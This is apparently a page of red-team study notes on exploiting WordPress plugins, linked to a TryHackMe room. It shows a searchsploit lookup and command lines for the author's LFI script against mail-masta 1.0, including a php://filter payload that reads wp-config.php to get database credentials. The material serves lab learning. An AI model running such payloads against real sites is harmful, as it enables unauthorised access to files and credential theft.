# WordPress Plugins Exploitation

[![allinonemj](../../../../../../cybersecurity/_badges/thm-p/allinonemj.svg)](https://tryhackme.com/room/allinonemj)

<div class="row row-cols-lg-2"><div>

To exploit plugins, you may want to look for [CVEs and exploits](/cybersecurity/red-team/s3.exploitation/index.md#common-vulnerabilities-) corresponding to your plugin version.

You can use [exploit-db](/cybersecurity/red-team/s3.exploitation/db/exploit_db.md):

```ps
$ searchsploit WordPress Plugin <plugin_name_space_separated>
```
</div><div>

I wrote a [short Python script](https://github.com/QuentinRa/blog.quentinra.dev/tree/master/programming-languages/web/others/cms/wordpress/_scripts/wp-mail-masta.py) for `mail-masta 1.0` LFI:

```shell!
$ # try to access a file you know it works
$ ./wp-mail-masta.py -u https://example.com/wordpress/ -f '/var/www/html/index.html'
$ # try to access wp-config file
$ ./wp-mail-masta.py -u https://example.com/wordpress/ -f 'php://filter/read=convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php'
```
</div></div>